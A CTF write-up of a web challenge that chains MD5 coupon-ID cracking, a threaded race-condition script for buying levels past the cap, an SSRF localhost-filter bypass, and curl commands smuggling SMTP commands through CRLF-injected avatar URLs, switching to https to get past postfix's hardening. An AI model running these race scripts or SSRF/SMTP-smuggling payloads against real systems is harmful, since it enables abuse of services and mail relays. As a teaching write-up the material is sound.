# MMORPG 3000 (web, 2 solved, 470p)

We failed to get the flag during the CTF, but only because we missed a funny `hardening` of postfix mail server at the very end of the task.
It might still be useful to provide the description of the intermediate steps, because the challenge had quite a few.

## Analysis

In the task we gain access to a webpage where we can battle other players and gain experience, and in the process also gain levels.
There is also `donate` page where we can provide details for a `coupon`, and by using such coupon we can gain money.
With money we can buy levels in the game.
Classic pay-to-win scenario.

We get a free coupon to start with, so we have some data for analysis.
When we `use` a coupon, we get intermediate stage, with coupon details in the cookie, and the coupon picture is displayed on the page.

## Getting money

We can't change the data of the coupon in cookie, since it's signed, but we can try to figure out how the codes are generated.
Last part of the coupon picture link is some 16 byte hexstring.
If we proceed to treat this as a hash and break it, we get a nice small integer back! 
If we look at link for coupon with id `1` for link http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_c4ca4238a0b923820dcc509a6f75849b.png we get a nice:

![](coupon.png)

It's worth 1337 coins, and so are next few low-id coupons.

## Getting high level

Once we start buying levels it caps at 30 and the error says you can't go past that.
But we guess that maybe there is some race condition here, and maybe it's possible to go above 30.
With a new account we get some money and prepared 2 separate sessions and run a race script:

```python
import threading

import requests
from queue import Queue

max = 100
threads = Queue()
init_barrier = threading.Barrier(max * 2)


def lvlup(cookie):
    threads.get()
    init_barrier.wait()
    url = "http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/donate/lvlup"
    r = requests.get(url, cookies={"session": cookie})
    threads.task_done()


def worker2(index):
    lvlup("eyJ1aWQiOjUyOH0.DjXY-g.qjbHf51nmM7SzUbzkS_Ghu3vzxk")


def worker(index):
    lvlup("eyJ1aWQiOjUyOH0.DjXY2Q.76b4qhlA72cQ0CygdmkvhTJEdFI")


def race():
    for i in range(max):
        thread = threading.Thread(target=worker, args=[i])
        thread.daemon = True
        thread.start()
    for i in range(max):
        thread = threading.Thread(target=worker2, args=[i])
        thread.daemon = True
        thread.start()
    for i in range(max * 2):
        threads.put(i)
    threads.join()


race()
```

We basically fire 100 threads for each of 2 sessions and try to buy level with them.
We managed to get lvl 31 on one account and 32 on another, which is above 30, so it worked fine.
Once this is done a new link appears in the user profile page - upload your avatar.
We can either upload a local file, which was broken for large part of the CTF, or provide a link and server downloads the picture via python urllib.
The latter option means we actually have SSRF!

## SSRF

It took us a while to figure out what we could do with SSRF here.
We noticed there is some lousy check for passing `localhost` or `127.0.0.1`, but it could be easily bypassed using dns resolving to localhost or just using `127.0.0.2`.
This poined us into the direction of requesting something from localhost, but we didn't know what, and only `http` and `https` scheme was supported.
To make matters worse we could not see any echo, if the result was not a picture.
We could, however, see when certain link was `down`.

We used this to `port scan` the local machine, and we found out that port `25` was available.
This pointed us to similar idea as in https://github.com/p4-team/ctf/tree/master/2017-12-09-seccon-quals/web_sqlsrf task where we were supposed to send email using HTTP header injection.

We tested this locally, and it seemed just fine, we could inject headers via newlines/carrige returns in the link, and therefore we could pass SMTP commands.
So we tried sending:

```
curl 'web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/avatar' -H 'Cookie: session=eyJ1aWQiOjE2NX0.DjfNgg.FM5Rbzw1uSiBvKx5L7YUoFpJsGk' --data 'url=http://127.0.0.2%0d%0aHELO 127.0.0.2%0aMAIL FROM: <A@B.C>%0aRCPT TO: <SHALOM@P4.TEAM>%0aDATA%0aFROM: AAA@B.C%0aTO: SHALOM@P4.TEAM%0aSUBJECT: GIB%0d%0a.%0d%0a%0aQUIT%0a:25&action=save'
```

But for some reason we got no emails from the server...

Our mistake was missing the special case implemented in postfix:

```c
#define DEF_SMTPD_FORBID_CMDS    "CONNECT GET POST"

        /* Ignore smtpd_forbid_cmds lookup errors. Non-critical feature. */
        if (cmdp->name == 0) {
        state->where = SMTPD_CMD_UNKNOWN;
        if (is_header(argv[0].strval)
            || (*var_smtpd_forbid_cmds
         && string_list_match(smtpd_forbid_cmds, argv[0].strval))) {
                msg_warn("non-SMTP command from %s: %.100s",
                     state->namaddr, vstring_str(state->buffer));
                smtpd_chat_reply(state, "221 2.7.0 Error: I can break rules, too. Goodbye.");
                break;
            }
        }

```

There is a hardening which targets exactly what we wanted to do - using HTTP request with injected headers to smuggle SMTP commands.
The way to bypass this was to use `https` instead of `http`, because in such case the initial part of the request will actually be encrypted, and SMTP will ignore it, and the Host will be in plaintext so the server will receive nice set of SMTP commands.
So is we instead send:

```
curl 'web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/avatar' -H 'Cookie: session=eyJ1aWQiOjE2NX0.DjfNgg.FM5Rbzw1uSiBvKx5L7YUoFpJsGk' --data 'url=https://127.0.0.2%0d%0aHELO 127.0.0.2%0aMAIL FROM: <A@B.C>%0aRCPT TO: <SHALOM@P4.TEAM>%0aDATA%0aFROM: AAA@B.C%0aTO: SHALOM@P4.TEAM%0aSUBJECT: GIB%0d%0a.%0d%0a%0aQUIT%0a:25&action=save'
```

We get a nice email with:

```
Message-ID: <20180722213651.1119A1F05FA9@flag.ctfzone.1640392aaf27597150c97e04a99a6f08.localdomain>
```

And the flag is `ctfzone{1640392aaf27597150c97e04a99a6f08}`
